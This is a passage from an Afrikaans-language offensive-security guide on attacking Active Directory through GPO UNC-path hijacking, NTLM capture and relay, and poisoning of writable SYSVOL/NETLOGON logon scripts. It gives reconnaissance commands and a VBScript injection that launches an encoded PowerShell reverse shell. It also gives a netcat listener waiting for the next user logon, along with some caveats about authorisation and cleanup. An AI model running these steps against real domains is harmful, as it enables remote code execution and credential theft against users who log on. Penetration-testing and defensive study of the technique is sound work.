GPP drive mappings in `Drives.xml` veroorsaak dat gebruikers tydens aanmelding of herverbinding by die opgestelde UNC-pad sta verifieer. As jy die verwysde gasheer namaak, kan jy **NetNTLMv2** vasvang. As SMB doelbewus laat misluk word, kan Windows weer oor **WebDAV** probeer en **NTLM oor HTTP** stuur, wat baie meer buigsaam is vir relays na **LDAP(S)**, **AD CS** of **SMB**.

#### Logon/startup script UNC hijack

Dieselfde patroon geld vir scripts wat op UNC-gashere aangebied word en in `SYSVOL` ontdek is:

- **Logon scripts** word gewoonlik in die **user**-konteks uitgevoer.
- **Startup scripts** word gewoonlik in die **computer / SYSTEM**-konteks uitgevoer.

As die scriptpad na ’n gasheernaam wys wat nagemaak kan word, herlei die UNC-gasheer en bied vervangende scriptinhoud vanaf die verwagte ligging aan.

## SYSVOL/NETLOGON Logon Script Poisoning

Skryfbare paaie onder `\\<dc>\SYSVOL\<domain>\scripts\` of `\\<dc>\NETLOGON\` laat toe dat daar met logon scripts gepeuter word wat via GPO tydens gebruikersaanmelding uitgevoer word. Dit lewer code execution in die sekuriteitskonteks van gebruikers wat aanmeld.

### Vind logon scripts
- Ondersoek user-attributen vir ’n opgestelde logon script:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Deursoek domeindelings om kortpaaie of verwysings na skripte op te spoor:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- Ontleed `.lnk`-lêers om teikens op te spoor wat na SYSVOL/NETLOGON wys (’n nuttige DFIR-truuk en vir aanvallers sonder direkte GPO-toegang):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound wys die gebruikerobjek se `scriptPath`-aanmeldingskripkenmerk wanneer dit teenwoordig is. GPO-gekonfigureerde aanmeldingskripte is ’n aparte beleidsverwysing, dus moet jy ook die toepaslike GPO ondersoek.

### Valideer skryftoegang (moenie deellysinskrywings vertrou nie)
Outomatiese nutsmiddels kan SYSVOL/NETLOGON as leesalleen wys, selfs wanneer die presiese skrip ’n ander NTFS-ACL het. Begin met leesalleen-inspeksie van daardie lêer en sy ouergids; ooreenstemmende Allow ACE’s bly kandidate omdat effektiewe SMB- en NTFS-toegang, Deny ACE’s en die huidige token alles saak maak:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

’n Gemagtigde skryftoets moet op ’n spesifieke teiken gerig en omkeerbaar wees, met die oorspronklike script gerugsteun en herstel. Moenie ’n werkende logonscript oorskryf net om toegang te toets nie; ’n suksesvolle skryfpoging kan tydens die volgende gebruiker se aanmelding uitgevoer word.

### Poison a VBScript-logonscript vir RCE
Voeg ’n opdrag by wat ’n PowerShell reverse shell (gegenereer vanaf revshells.com) begin, en behou die oorspronklike logika om te voorkom dat besigheidsfunksies ontwrig word:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Luister op jou gasheer en wag vir die volgende interaktiewe aanmelding:

```bash
rlwrap -cAr nc -lnvp 443
```

Notas:
- Uitvoering vind plaas met die aanmeldgebruiker se token (nie SYSTEM nie). Die omvang is die GPO-skakel (OU, werf, domein) wat daardie script toepas.
- Maak ná gebruik skoon deur die oorspronklike inhoud/tydstempels te herstel.


## References

- [1] [Misbruik van Active Directory ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Bevoorregte rekeninge en token-voorregte](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Die ACL-aanvalspadopdatering](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Voorregte-eskalasie met ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Skandering vir Active Directory-voorregte en bevoorregte rekeninge](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – AD-kenmerk/UAC-bewerkings vanaf Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (groeplidmaatskap)](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL-misbruik, KeePassXC Argon2-kraking en DPAPI-dekripsie tot DC-admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Kaping van GPO UNC-paaie vir kode-uitvoering en NTLM-relaying](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: uitbuiting van Active Directory-GPOs deur NTLM-relaying, en meer](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU maak 'n grap? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: uitbuiting van versteekte Organizational Units-ACL-aanvalvektore in Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Simulering van wettige Active Directory-dienste op die netwerk: die geval van GPO-uitbuiting](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
- [18] [HTB: Hercules — OU-beweging en misbruik van geërfde ACLs](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
